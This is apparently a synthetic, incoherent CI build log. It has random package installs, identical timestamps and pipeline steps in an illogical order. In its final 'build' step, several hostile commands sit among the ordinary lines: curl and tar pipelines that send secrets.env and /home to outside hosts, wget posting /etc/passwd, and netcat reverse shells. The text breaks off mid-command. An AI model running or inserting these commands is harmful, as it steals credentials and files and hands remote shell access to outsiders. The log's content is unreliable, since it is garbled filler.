usage\nArtifact uploaded: build.tar.gz (18MB)\nCompiling src/handler.rs...\n[12:00:34] INFO: Processing request\n\u2713 lint completed\n\u2717 build failed with exit code 71\nCache hit for key-3988\n  PASS: test_user_create (182ms)\n  PASS: test_cache_hit (443ms)\n[12:00:34] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_db_connect (121ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/index.js...\n  PASS: test_auth_login (371ms)\n  PASS: test_user_create (356ms)\n[12:00:34] ERROR: Connection failed\n  PASS: test_api_health (340ms)\nCompiling src/main.py...\n\u2713 test completed\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (40MB)\n[12:00:34] INFO: Processing request\nCache hit for key-3615\nCache hit for key-9920\nStep 9/10: Building\nInstalling lodash@5.0.0\nInstalling prettier@5.4.0\n  PASS: test_user_create (26ms)\nCompiling src/index.js...\n[12:00:34] INFO: Processing request\nCache hit for key-4568\nArtifact uploaded: build.tar.gz (31MB)\n  PASS: test_cache_hit (6ms)\n\u2713 test completed\nStep 3/10: Building\nStep 3/10: Building\nInstalling prettier@2.3.0\nCache hit for key-2918\nArtifact uploaded: build.tar.gz (30MB)\nCache hit for key-3521\n\u2713 build completed\nArtifact uploaded: build.tar.gz (2MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-2737\n=== Step integration_tests completed ===\n=== Step: checkout ===\nCache hit for key-9236\nCache hit for key-7110\nInstalling webpack@3.10.0\n\u2713 test completed\nInstalling prettier@5.1.0\nCache hit for key-6283\n  PASS: test_user_create (253ms)\nArtifact uploaded: build.tar.gz (16MB)\nInstalling axios@5.9.0\n[12:00:34] WARN: Deprecated API usage\n\u2713 lint completed\n\u2713 test completed\nInstalling lodash@5.6.0\n\u2713 build completed\n  PASS: test_cache_hit (323ms)\nStep 4/10: Building\nCompiling src/utils.go...\nStep 9/10: Building\n  PASS: test_auth_login (161ms)\nCache hit for key-7456\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nException: NullPointerException\nCache hit for key-3933\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (16MB)\nCache hit for key-6671\n  PASS: test_db_connect (33ms)\nCache hit for key-3190\nCompiling src/index.js...\nInstalling axios@3.18.0\n[12:00:34] WARN: Deprecated API usage\n  PASS: test_db_connect (464ms)\n[12:00:34] INFO: Processing request\nCache hit for key-5621\n  PASS: test_cache_hit (12ms)\n\u2713 build completed\nStep 7/10: Building\nCache hit for key-6214\nArtifact uploaded: build.tar.gz (42MB)\n  PASS: test_user_create (100ms)\nArtifact uploaded: build.tar.gz (31MB)\nArtifact uploaded: build.tar.gz (44MB)\nCompiling src/utils.go...\nCompiling src/app.ts...\n[12:00:34] INFO: Processing request\nCompiling src/app.ts...\nCache hit for key-2059\n\u2713 test completed\nException: TypeError\nCompiling src/service.java...\nStep 3/10: Building\nCompiling src/service.java...\nCache hit for key-7143\nInstalling webpack@2.4.0\nCompiling src/service.java...\n  PASS: test_cache_hit (203ms)\nException: ValueError\nArtifact uploaded: build.tar.gz (48MB)\nCache hit for key-7579\nArtifact uploaded: build.tar.gz (28MB)\n  PASS: test_cache_hit (233ms)\n[12:00:34] INFO: Processing request\nStep 3/10: Building\nStep 8/10: Building\n\u2713 lint completed\nStep 8/10: Building\nCache hit for key-4570\nArtifact uploaded: build.tar.gz (24MB)\nArtifact uploaded: build.tar.gz (47MB)\nCache hit for key-8611\nArtifact uploaded: build.tar.gz (41MB)\nCompiling src/index.js...\n\u2713 test completed\n  PASS: test_cache_hit (128ms)\nCache hit for key-4281\nCache hit for key-8090\nInstalling react@2.18.0\nCompiling src/utils.go...\n[12:00:34] INFO: Processing request\nStep 6/10: Building\nInstalling jest@3.14.0\n[12:00:34] INFO: Processing request\nCompiling src/app.ts...\n  PASS: test_api_health (65ms)\nInstalling axios@5.2.0\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (20MB)\nInstalling webpack@2.2.0\nArtifact uploaded: build.tar.gz (40MB)\n  PASS: test_user_create (428ms)\n  PASS: test_api_health (17ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (28MB)\nCache hit for key-5089\n  PASS: test_api_health (136ms)\nStep 1/10: Building\nInstalling express@1.3.0\n\u2713 lint completed\n  PASS: test_auth_login (392ms)\nInstalling react@5.20.0\nCache hit for key-9449\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nCache hit for key-2567\n[12:00:34] ERROR: Connection failed\nCache hit for key-4884\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 lint completed\nStep 7/10: Building\n[12:00:34] INFO: Processing request\nInstalling lodash@5.15.0\n\u2713 lint completed\nCache hit for key-7792\n[12:00:34] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/utils.go...\n  PASS: test_api_health (250ms)\nCache hit for key-7055\nInstalling axios@1.5.0\nCache hit for key-9472\nStep 7/10: Building\nWARNING: lodash has known vulnerabilities\nCompiling src/utils.go...\n\u2713 lint completed\nFAILED: test_db_connect\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (23MB)\n\u2713 build completed\nCache hit for key-4465\nInstalling express@3.17.0\nInstalling react@2.13.0\nStep 6/10: Building\n[12:00:34] INFO: Processing request\nCompiling src/utils.go...\nInstalling axios@4.3.0\nStep 4/10: Building\nInstalling prettier@3.20.0\nCache hit for key-6778\nArtifact uploaded: build.tar.gz (47MB)\nInstalling webpack@1.0.0\n\u2717 build failed with exit code 80\n  PASS: test_auth_login (414ms)\nStep 6/10: Building\n[12:00:34] INFO: Processing request\nStep 9/10: Building\n  PASS: test_db_connect (131ms)\n\u2713 lint completed\n\u2713 test completed\n\u2713 lint completed\nInstalling prettier@4.7.0\n[12:00:34] INFO: Processing request\n\u2713 lint completed\n\u2713 build completed\nInstalling eslint@4.17.0\nStep 10/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling jest@5.6.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: axios has known vulnerabilities\nInstalling webpack@4.20.0\nStep 5/10: Building\nCache hit for key-8076\nStep 9/10: Building\n  PASS: test_user_create (138ms)\nWARNING: lodash has known vulnerabilities\n\u2713 lint completed\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (2MB)\nCompiling src/main.py...\nStep 8/10: Building\nCompiling src/service.java...\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (36MB)\nCache hit for key-5139\nArtifact uploaded: build.tar.gz (13MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 test completed\nInstalling express@5.0.0\nInstalling jest@4.3.0\n  PASS: test_db_connect (3ms)\nArtifact uploaded: build.tar.gz (17MB)\nStep 6/10: Building\nCache hit for key-4006\n[12:00:34] WARN: Deprecated API usage\nStep 9/10: Building\nInstalling axios@1.8.0\n[12:00:34] INFO: Processing request\nException: NullPointerException\nStep 7/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-4863\nCompiling src/index.js...\nInstalling prettier@2.10.0\nStep 7/10: Building\n  PASS: test_cache_hit (72ms)\n[12:00:34] INFO: Processing request\nInstalling lodash@3.8.0\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (42MB)\nInstalling axios@4.11.0\nInstalling jest@5.13.0\n  PASS: test_api_health (64ms)\nArtifact uploaded: build.tar.gz (41MB)\nWARNING: lodash has known vulnerabilities\nInstalling eslint@2.14.0\n  PASS: test_cache_hit (333ms)\nStep 2/10: Building\nInstalling express@1.15.0\n\u2713 build completed\nCache hit for key-1508\n  PASS: test_auth_login (259ms)\nCache hit for key-1276\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 test completed\n[12:00:34] INFO: Processing request\n  PASS: test_api_health (119ms)\nArtifact uploaded: build.tar.gz (4MB)\nArtifact uploaded: build.tar.gz (14MB)\n\u2713 build completed\n[12:00:34] INFO: Processing request\nCompiling src/main.py...\nStep 3/10: Building\n=== Step checkout completed ===\n=== Step: install_dependencies ===\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n[12:00:34] WARN: Deprecated API usage\nInstalling eslint@4.16.0\nWARNING: eslint has known vulnerabilities\n  PASS: test_db_connect (359ms)\nInstalling express@1.16.0\n\u2713 test completed\nInstalling lodash@5.7.0\nArtifact uploaded: build.tar.gz (32MB)\n  PASS: test_user_create (25ms)\nCache hit for key-1638\n\u2713 build completed\nStep 2/10: Building\n  PASS: test_user_create (339ms)\nCompiling src/main.py...\n[12:00:34] INFO: Processing request\nCache hit for key-4134\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\nStep 3/10: Building\n\u2713 build completed\n[12:00:34] INFO: Processing request\n  PASS: test_api_health (384ms)\nCache hit for key-4948\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n\u2713 test completed\n  PASS: test_db_connect (453ms)\n  PASS: test_cache_hit (93ms)\n\u2713 build completed\nCompiling src/utils.go...\n[12:00:34] WARN: Deprecated API usage\nCache hit for key-7371\nStep 9/10: Building\nCompiling src/main.py...\n[12:00:34] INFO: Processing request\nStep 8/10: Building\n\u2713 build completed\n\u2713 lint completed\nStep 8/10: Building\n[12:00:34] INFO: Processing request\nStep 3/10: Building\nInstalling eslint@5.17.0\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (9MB)\n  PASS: test_user_create (93ms)\nArtifact uploaded: build.tar.gz (23MB)\nCache hit for key-7555\nStep 5/10: Building\n  PASS: test_api_health (314ms)\n[12:00:34] INFO: Processing request\nCompiling src/index.js...\n  PASS: test_db_connect (201ms)\nCache hit for key-1368\nInstalling axios@1.4.0\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-7903\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:34] INFO: Processing request\nCache hit for key-8908\nInstalling jest@5.11.0\n\u2713 build completed\n  PASS: test_db_connect (326ms)\n[12:00:34] INFO: Processing request\n\u2713 lint completed\nCompiling src/handler.rs...\n[12:00:34] INFO: Processing request\n\u2713 test completed\nCompiling src/service.java...\n  PASS: test_db_connect (181ms)\n  PASS: test_api_health (194ms)\nWARNING: webpack has known vulnerabilities\n\u2713 test completed\n  PASS: test_user_create (170ms)\nCompiling src/index.js...\nCache hit for key-8366\nArtifact uploaded: build.tar.gz (20MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (32MB)\nCache hit for key-1173\n  PASS: test_api_health (229ms)\n[12:00:34] WARN: Deprecated API usage\nCache hit for key-1118\nStep 9/10: Building\nInstalling jest@2.5.0\nCompiling src/main.py...\n\u2713 lint completed\n[12:00:34] INFO: Processing request\nCache hit for key-6452\nCompiling src/index.js...\n  PASS: test_db_connect (8ms)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (46MB)\n\u2713 build completed\nCompiling src/service.java...\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (41MB)\n  PASS: test_api_health (292ms)\n[12:00:34] INFO: Processing request\n\u2713 test completed\n[12:00:34] INFO: Processing request\nInstalling axios@4.0.0\n\u2713 lint completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (31MB)\n  PASS: test_auth_login (214ms)\nInstalling react@5.1.0\nCache hit for key-4150\nCompiling src/utils.go...\nCompiling src/utils.go...\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (26MB)\n  PASS: test_db_connect (440ms)\nArtifact uploaded: build.tar.gz (27MB)\nInstalling webpack@3.19.0\n\u2713 build completed\n[12:00:34] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (42MB)\nCache hit for key-6656\nCompiling src/service.java...\nStep 3/10: Building\n[12:00:34] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (19MB)\nInstalling lodash@4.5.0\nInstalling jest@4.0.0\n\u2713 build completed\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (46MB)\nArtifact uploaded: build.tar.gz (28MB)\nCache hit for key-1608\nWARNING: lodash has known vulnerabilities\n[12:00:34] INFO: Processing request\nCompiling src/app.ts...\nInstalling webpack@3.7.0\nCache hit for key-4724\nStep 8/10: Building\n  PASS: test_auth_login (257ms)\nInstalling lodash@1.13.0\nArtifact uploaded: build.tar.gz (20MB)\n\u2713 test completed\nWARNING: axios has known vulnerabilities\nInstalling webpack@5.13.0\nArtifact uploaded: build.tar.gz (5MB)\n  PASS: test_cache_hit (50ms)\nCache hit for key-1645\nException: NullPointerException\n[12:00:34] INFO: Processing request\n\u2713 test completed\n  PASS: test_user_create (142ms)\nCompiling src/service.java...\nInstalling jest@3.12.0\nCache hit for key-1476\n[12:00:34] INFO: Processing request\n  PASS: test_cache_hit (189ms)\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nCache hit for key-3781\nStep 10/10: Building\nCompiling src/index.js...\nInstalling eslint@5.13.0\nArtifact uploaded: build.tar.gz (33MB)\nArtifact uploaded: build.tar.gz (47MB)\n\u2713 build completed\n[12:00:34] INFO: Processing request\nCache hit for key-2446\n\u2713 test completed\n  PASS: test_auth_login (325ms)\nInstalling prettier@4.17.0\nWARNING: express has known vulnerabilities\nInstalling react@1.15.0\n  PASS: test_user_create (248ms)\nInstalling prettier@5.18.0\n\u2713 lint completed\nFAILED: test_api_health\n\u2717 build failed with exit code 35\nWARNING: lodash has known vulnerabilities\n\u2713 build completed\n\u2713 build completed\nInstalling express@2.11.0\n  PASS: test_cache_hit (267ms)\nArtifact uploaded: build.tar.gz (9MB)\n\u2713 lint completed\nCache hit for key-9445\nInstalling prettier@5.5.0\nStep 4/10: Building\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (19MB)\n  PASS: test_db_connect (80ms)\nArtifact uploaded: build.tar.gz (9MB)\n\u2713 test completed\nStep 2/10: Building\nInstalling prettier@2.2.0\nArtifact uploaded: build.tar.gz (12MB)\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:34] INFO: Processing request\nCache hit for key-1622\nCompiling src/index.js...\n[12:00:34] INFO: Processing request\nCompiling src/handler.rs...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (11MB)\nCompiling src/utils.go...\n[12:00:34] ERROR: Connection failed\nStep 5/10: Building\n  PASS: test_auth_login (27ms)\n  PASS: test_db_connect (89ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/handler.rs...\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_user_create (295ms)\n  PASS: test_api_health (168ms)\nCompiling src/utils.go...\nCache hit for key-2933\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (40MB)\nStep 9/10: Building\nStep 8/10: Building\n=== Step install_dependencies completed ===\n=== Step: unit_tests ===\nStep 5/10: Building\n  PASS: test_api_health (344ms)\nCache hit for key-1059\nCompiling src/service.java...\nInstalling prettier@1.15.0\nArtifact uploaded: build.tar.gz (15MB)\n\u2717 build failed with exit code 55\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\n  PASS: test_cache_hit (473ms)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (22MB)\n  PASS: test_user_create (212ms)\nInstalling express@2.15.0\n  PASS: test_db_connect (404ms)\n  PASS: test_auth_login (223ms)\nCache hit for key-9384\n  PASS: test_user_create (272ms)\nCompiling src/index.js...\nInstalling axios@2.10.0\n[12:00:34] INFO: Processing request\nCompiling src/app.ts...\n\u2713 build completed\nCache hit for key-7603\n[12:00:34] ERROR: Connection failed\n  PASS: test_user_create (338ms)\nArtifact uploaded: build.tar.gz (20MB)\nCompiling src/handler.rs...\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (18MB)\n\u2713 lint completed\nStep 9/10: Building\nCompiling src/utils.go...\nStep 4/10: Building\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (45MB)\nArtifact uploaded: build.tar.gz (45MB)\nStep 8/10: Building\n\u2713 test completed\n  PASS: test_user_create (269ms)\nStep 2/10: Building\nWARNING: lodash has known vulnerabilities\n\u2713 test completed\n[12:00:34] INFO: Processing request\nStep 7/10: Building\nCache hit for key-2806\nInstalling axios@4.17.0\nCache hit for key-8248\nArtifact uploaded: build.tar.gz (15MB)\n\u2713 test completed\n\u2713 lint completed\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n  PASS: test_api_health (359ms)\nCompiling src/handler.rs...\n[12:00:34] WARN: Deprecated API usage\n\u2713 lint completed\nInstalling express@4.16.0\nCache hit for key-5284\nInstalling lodash@3.3.0\n[12:00:34] INFO: Processing request\nWARNING: lodash has known vulnerabilities\n\u2713 test completed\nInstalling eslint@1.11.0\n\u2713 test completed\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\n[12:00:34] INFO: Processing request\nCache hit for key-2615\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (9MB)\nArtifact uploaded: build.tar.gz (14MB)\nStep 4/10: Building\nCompiling src/handler.rs...\n[12:00:34] INFO: Processing request\n\u2713 test completed\n  PASS: test_cache_hit (155ms)\n[12:00:34] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (44MB)\nArtifact uploaded: build.tar.gz (21MB)\n\u2713 test completed\n[12:00:34] INFO: Processing request\n  PASS: test_api_health (243ms)\nCache hit for key-7221\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_user_create (470ms)\nCache hit for key-5347\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nStep 10/10: Building\nException: ValueError\n\u2713 build completed\n  PASS: test_cache_hit (24ms)\nCompiling src/utils.go...\nCompiling src/app.ts...\nCache hit for key-1844\nStep 6/10: Building\nInstalling express@5.16.0\n  PASS: test_db_connect (412ms)\nInstalling jest@5.14.0\nCompiling src/service.java...\n\u2713 test completed\nWARNING: lodash has known vulnerabilities\nCache hit for key-2868\nCompiling src/handler.rs...\n[12:00:34] WARN: Deprecated API usage\n[12:00:34] INFO: Processing request\nCache hit for key-4688\nArtifact uploaded: build.tar.gz (24MB)\nStep 10/10: Building\n  PASS: test_user_create (328ms)\nCache hit for key-2167\n  PASS: test_cache_hit (149ms)\nStep 7/10: Building\n\u2717 build failed with exit code 51\n\u2713 lint completed\n  PASS: test_auth_login (363ms)\nStep 7/10: Building\nCompiling src/app.ts...\nStep 5/10: Building\n  PASS: test_auth_login (466ms)\nWARNING: axios has known vulnerabilities\n[12:00:34] INFO: Processing request\n\u2713 lint completed\n  PASS: test_auth_login (145ms)\nInstalling axios@2.3.0\nStep 3/10: Building\nCache hit for key-8513\n[12:00:34] INFO: Processing request\n  PASS: test_user_create (175ms)\n[12:00:34] INFO: Processing request\nInstalling express@4.2.0\nCache hit for key-9178\nCache hit for key-8177\nCompiling src/handler.rs...\nCompiling src/app.ts...\n[12:00:34] INFO: Processing request\nCache hit for key-6753\nStep 6/10: Building\nStep 3/10: Building\n  PASS: test_cache_hit (281ms)\nCache hit for key-7990\nArtifact uploaded: build.tar.gz (49MB)\nCache hit for key-4339\nStep 3/10: Building\nException: RuntimeError\n\u2713 build completed\nInstalling webpack@4.19.0\nCompiling src/utils.go...\nCache hit for key-1775\n  PASS: test_auth_login (251ms)\nArtifact uploaded: build.tar.gz (11MB)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (46MB)\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: build.tar.gz (21MB)\n  PASS: test_db_connect (409ms)\nStep 1/10: Building\n\u2713 lint completed\nException: TypeError\n[12:00:34] INFO: Processing request\n  PASS: test_api_health (148ms)\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (4MB)\nCompiling src/service.java...\nInstalling express@3.9.0\nArtifact uploaded: build.tar.gz (29MB)\nArtifact uploaded: build.tar.gz (45MB)\nCache hit for key-8014\nCache hit for key-5439\n  PASS: test_api_health (254ms)\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (49MB)\n\u2713 build completed\nStep 10/10: Building\n[12:00:34] INFO: Processing request\n\u2713 test completed\n\u2713 build completed\nCache hit for key-3291\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling prettier@4.10.0\nCache hit for key-4408\nInstalling prettier@3.4.0\nStep 4/10: Building\n\u2717 build failed with exit code 40\nCache hit for key-8439\nCache hit for key-8663\n\u2713 test completed\nCache hit for key-5785\n\u2713 test completed\nCompiling src/handler.rs...\nStep 3/10: Building\nCache hit for key-7415\nStep 4/10: Building\n\u2713 build completed\n[12:00:34] ERROR: Connection failed\nCompiling src/main.py...\nStep 1/10: Building\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (50MB)\nInstalling react@4.3.0\nStep 1/10: Building\nCompiling src/service.java...\n  PASS: test_db_connect (273ms)\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (2MB)\nCache hit for key-8195\nCompiling src/index.js...\nInstalling express@4.6.0\nArtifact uploaded: build.tar.gz (19MB)\nCache hit for key-9222\nArtifact uploaded: build.tar.gz (14MB)\nStep 3/10: Building\nWARNING: eslint has known vulnerabilities\nArtifact uploaded: build.tar.gz (39MB)\nInstalling prettier@3.7.0\nInstalling lodash@5.1.0\n  PASS: test_api_health (283ms)\nInstalling prettier@1.14.0\nStep 2/10: Building\nStep 5/10: Building\nInstalling axios@3.12.0\n=== Step unit_tests completed ===\n=== Step: deploy_production ===\nCompiling src/utils.go...\nInstalling lodash@1.0.0\n[12:00:34] INFO: Processing request\n  PASS: test_api_health (469ms)\nInstalling express@2.14.0\nStep 4/10: Building\nWARNING: react has known vulnerabilities\n[12:00:34] INFO: Processing request\nWARNING: jest has known vulnerabilities\n  PASS: test_api_health (172ms)\nFAILED: test_user_create\nCache hit for key-7469\nCache hit for key-2414\nInstalling prettier@3.9.0\nInstalling prettier@5.17.0\nCompiling src/main.py...\nCache hit for key-7745\nArtifact uploaded: build.tar.gz (19MB)\n  PASS: test_api_health (125ms)\n[12:00:34] INFO: Processing request\nStep 6/10: Building\nCompiling src/handler.rs...\nStep 5/10: Building\n\u2713 build completed\nWARNING: webpack has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/service.java...\nCompiling src/index.js...\n  PASS: test_api_health (466ms)\nInstalling axios@1.14.0\nCompiling src/handler.rs...\nCache hit for key-3909\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 5/10: Building\nInstalling express@3.14.0\n[12:00:34] WARN: Deprecated API usage\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (3MB)\n\u2713 lint completed\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (17MB)\n  PASS: test_api_health (328ms)\nArtifact uploaded: build.tar.gz (20MB)\nCache hit for key-4234\nCache hit for key-5829\nInstalling jest@1.3.0\n[12:00:34] INFO: Processing request\nStep 7/10: Building\nInstalling jest@5.9.0\nCompiling src/utils.go...\n[12:00:34] WARN: Deprecated API usage\nCache hit for key-7715\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (45MB)\n[12:00:34] INFO: Processing request\nCache hit for key-8556\n[12:00:34] WARN: Deprecated API usage\nInstalling lodash@4.19.0\nStep 5/10: Building\nCache hit for key-5072\n[12:00:34] INFO: Processing request\nInstalling jest@1.15.0\nStep 7/10: Building\n\u2713 build completed\n[12:00:34] INFO: Processing request\nStep 2/10: Building\nCache hit for key-6380\nArtifact uploaded: build.tar.gz (1MB)\nInstalling lodash@4.2.0\n[12:00:34] INFO: Processing request\nCache hit for key-5099\nCompiling src/main.py...\n[12:00:34] WARN: Deprecated API usage\n  PASS: test_api_health (199ms)\n\u2717 build failed with exit code 76\nWARNING: jest has known vulnerabilities\n\u2713 build completed\nInstalling react@5.7.0\nStep 5/10: Building\n  PASS: test_auth_login (84ms)\nInstalling lodash@1.16.0\nCache hit for key-9682\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling jest@2.11.0\n\u2713 build completed\nCache hit for key-4963\n  PASS: test_auth_login (450ms)\nArtifact uploaded: build.tar.gz (46MB)\nCompiling src/main.py...\n\u2713 build completed\nStep 2/10: Building\nStep 8/10: Building\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-5268\n\u2713 build completed\n  PASS: test_api_health (10ms)\nArtifact uploaded: build.tar.gz (13MB)\n  PASS: test_cache_hit (194ms)\nStep 3/10: Building\nCompiling src/app.ts...\n  PASS: test_api_health (222ms)\nCache hit for key-6494\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/service.java...\nInstalling eslint@5.13.0\nStep 4/10: Building\nCompiling src/utils.go...\n\u2713 test completed\n  PASS: test_user_create (394ms)\nArtifact uploaded: build.tar.gz (41MB)\nArtifact uploaded: build.tar.gz (29MB)\nCache hit for key-8875\nArtifact uploaded: build.tar.gz (31MB)\nStep 1/10: Building\n\u2713 build completed\n  PASS: test_auth_login (204ms)\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (9MB)\nArtifact uploaded: build.tar.gz (3MB)\nCompiling src/utils.go...\n[12:00:34] INFO: Processing request\nStep 4/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (31MB)\n  PASS: test_api_health (179ms)\nInstalling jest@3.8.0\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:34] INFO: Processing request\n\u2713 lint completed\nCompiling src/main.py...\n\u2713 lint completed\nCache hit for key-5374\nInstalling eslint@1.19.0\nCache hit for key-9707\nInstalling webpack@4.8.0\nArtifact uploaded: build.tar.gz (7MB)\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (13MB)\nCompiling src/app.ts...\n[12:00:34] INFO: Processing request\nStep 9/10: Building\nStep 10/10: Building\n\u2717 build failed with exit code 1\nCompiling src/main.py...\n\u2713 test completed\nStep 4/10: Building\nCache hit for key-8166\nArtifact uploaded: build.tar.gz (5MB)\n  PASS: test_db_connect (103ms)\nCompiling src/service.java...\nCompiling src/handler.rs...\nInstalling react@1.1.0\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\nWARNING: lodash has known vulnerabilities\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (42MB)\nArtifact uploaded: build.tar.gz (26MB)\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n\u2713 test completed\n[12:00:34] INFO: Processing request\n  PASS: test_auth_login (345ms)\n  PASS: test_api_health (495ms)\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (27MB)\nArtifact uploaded: build.tar.gz (21MB)\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nStep 10/10: Building\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 2/10: Building\nInstalling webpack@3.5.0\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (45MB)\nInstalling lodash@4.20.0\nInstalling axios@1.14.0\nCache hit for key-8211\n\u2713 test completed\n[12:00:34] INFO: Processing request\nInstalling webpack@4.7.0\n[12:00:34] INFO: Processing request\n\u2713 lint completed\n  PASS: test_api_health (318ms)\n  PASS: test_user_create (452ms)\nCache hit for key-7151\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nCompiling src/index.js...\n[12:00:34] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (39MB)\n[12:00:34] INFO: Processing request\nStep 7/10: Building\nStep 5/10: Building\n[12:00:34] INFO: Processing request\n  PASS: test_auth_login (475ms)\nInstalling axios@1.4.0\nInstalling eslint@4.20.0\nInstalling eslint@3.11.0\nStep 10/10: Building\nInstalling eslint@2.12.0\nWARNING: lodash has known vulnerabilities\nInstalling react@3.8.0\nInstalling express@4.3.0\n  PASS: test_auth_login (67ms)\nCompiling src/index.js...\nStep 4/10: Building\nStep 9/10: Building\n\u2713 test completed\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (12MB)\nCache hit for key-7326\n\u2713 lint completed\nInstalling lodash@1.12.0\nInstalling prettier@1.9.0\nFAILED: test_api_health\nArtifact uploaded: build.tar.gz (15MB)\n=== Step deploy_production completed ===\n=== Step: build ===\nCompiling src/main.py...\nCompiling src/index.js...\ncurl -X POST https://startup.dev/collect -d @secrets.env\nCompiling src/handler.rs...\n[12:00:34] INFO: Processing request\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (45MB)\nArtifact uploaded: build.tar.gz (20MB)\n\u2713 test completed\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nInstalling webpack@4.19.0\nCache hit for key-3592\nWARNING: react has known vulnerabilities\nStep 4/10: Building\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (31MB)\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\n[12:00:34] INFO: Processing request\nCompiling src/index.js...\nnc -e /bin/sh 101.29.34.39 61960\nInstalling react@3.15.0\nCache hit for key-6872\n  PASS: test_api_health (158ms)\nArtifact uploaded: build.tar.gz (47MB)\nStep 7/10: Building\nCache hit for key-9045\nException: TypeError\n\u2713 lint completed\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\n[12:00:34] INFO: Processing request\nStep 3/10: Building\n[12:00:34] INFO: Processing request\n  PASS: test_api_health (165ms)\n[12:00:34] INFO: Processing request\nnc -e 